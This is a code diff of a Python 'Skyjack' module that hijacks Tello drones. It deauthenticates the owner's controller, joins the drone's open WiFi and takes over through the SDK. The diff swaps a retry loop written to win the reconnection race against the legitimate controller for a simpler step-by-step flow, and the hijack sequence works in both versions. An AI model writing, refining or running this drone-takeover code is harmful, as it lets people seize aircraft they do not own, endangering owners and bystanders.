@@ -96,48 +96,30 @@ class Skyjack:
             sudo_exec(f"ip link set {self.interface} up")
 
             # Wait for interface to come up
-            time.sleep(0.3)
+            time.sleep(1)
 
             # Connect to TELLO's WiFi network
             # TELLO drones have open networks (no password)
             print(f"[CONNECT] Connecting to TELLO WiFi: {self.target_name}...")
             result = sudo_exec(f"iw {self.interface} connect {self.target_name}")
-
+            
             # Check if connection command succeeded
             if result.returncode != 0:
                 print(f"[CONNECT] Error: iw connect failed with code {result.returncode}")
                 return False
 
-            # `iw connect` returns as soon as the request is issued, not
-            # once association actually completes - confirm real 802.11
-            # association before burning time on DHCP for a link that was
-            # never actually established.
-            print("[CONNECT] Verifying association...")
-            associated = False
-            for _ in range(6):
-                link_result = subprocess.run(
-                    f"iw {self.interface} link", shell=True, capture_output=True, text=True
-                )
-                if link_result.returncode == 0 and "Connected to" in link_result.stdout:
-                    associated = True
-                    break
-                time.sleep(0.3)
-
-            if not associated:
-                print(f"[CONNECT] Error: never associated to {self.target_name}")
-                return False
-
-            print("[CONNECT] Associated!")
+            # Wait for connection
+            time.sleep(2)
 
             # Get IP address via DHCP with timeout
             print(f"[CONNECT] Requesting IP address via DHCP...")
             # -1 : Try once and exit (faster than persistent mode)
-            # -timeout 5 : Give up after 5 seconds
-            sudo_exec(f"timeout 5 dhclient -1 {self.interface}")
+            # -timeout 10 : Give up after 10 seconds
+            sudo_exec(f"timeout 10 dhclient -1 {self.interface}")
 
             # Poll for IP address using subprocess directly to capture output
             print(f"[CONNECT] Verifying IP address...")
-            max_attempts = 3
+            max_attempts = 6
             for attempt in range(max_attempts):
                 # Use subprocess directly to capture output
                 result = subprocess.run(
@@ -169,10 +151,22 @@ class Skyjack:
                     print(f"[CONNECT] Error setting static IP: {e}")
                     return False
             
-            # Connectivity is verified by the SDK handshake in
-            # init_tello_sdk() right after this - skipping a diagnostic
-            # ping here saves several seconds in the race against the
-            # original controller reconnecting.
+            # Verify connectivity to drone with ping
+            print(f"[CONNECT] Testing connectivity to drone...")
+            ping_result = subprocess.run(
+                f"ping -c 2 -W 2 {self.tello_ip}",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+            
+            if ping_result.returncode != 0:
+                print(f"[CONNECT] Warning: Cannot ping drone at {self.tello_ip}")
+                print("[CONNECT] Waiting for network to stabilize...")
+                time.sleep(3)
+            else:
+                print("[CONNECT] Drone is reachable!")
+            
             print("[CONNECT] WiFi connection established!")
             return True
 
@@ -351,36 +345,22 @@ if __name__ == "__main__":
     print("  TELLO SKYJACK - Drone Hijacking Module")
     print("=" * 60)
 
-    # A single deauth burst only knocks the original controller off for a
-    # moment - it reconnects on its own, and with one radio we can't keep
-    # jamming it while also associating as a managed-mode client. So this
-    # retries the whole deauth -> connect -> SDK handshake sequence a few
-    # times in case the original controller wins the reconnection race.
-    MAX_ATTEMPTS = 3
-    for attempt in range(1, MAX_ATTEMPTS + 1):
-        print(f"\n[ATTEMPT {attempt}/{MAX_ATTEMPTS}]")
+    # Step 1: Deauthenticate the current controller
+    print("\n[STEP 1] Deauthenticating current controller...")
+    if not skyjack.deauth_drone():
+        print("[ABORT] Deauthentication failed. Exiting.")
+        exit(1)
 
-        # Step 1: Deauthenticate the current controller
-        print("\n[STEP 1] Deauthenticating current controller...")
-        if not skyjack.deauth_drone():
-            print("[ABORT] Deauthentication failed. Exiting.")
-            exit(1)
+    # Step 2: Connect to the drone's WiFi
+    print("\n[STEP 2] Connecting to drone WiFi...")
+    if not skyjack.connect_to_drone():
+        print("[ABORT] Failed to connect to drone WiFi. Exiting.")
+        exit(1)
 
-        # Step 2: Connect to the drone's WiFi
-        print("\n[STEP 2] Connecting to drone WiFi...")
-        if not skyjack.connect_to_drone():
-            print("[RETRY] Failed to connect - the original controller likely reconnected first.")
-            continue
-
-        # Step 3: Initialize SDK mode
-        print("\n[STEP 3] Initializing TELLO SDK...")
-        if not skyjack.init_tello_sdk():
-            print("[RETRY] Failed to enter SDK mode.")
-            continue
-
-        break
-    else:
-        print(f"\n[ABORT] Could not take control of the drone after {MAX_ATTEMPTS} attempts. Exiting.")
+    # Step 3: Initialize SDK mode
+    print("\n[STEP 3] Initializing TELLO SDK...")
+    if not skyjack.init_tello_sdk():
+        print("[ABORT] Failed to enter SDK mode. Exiting.")
         skyjack.cleanup()
         exit(1)
 
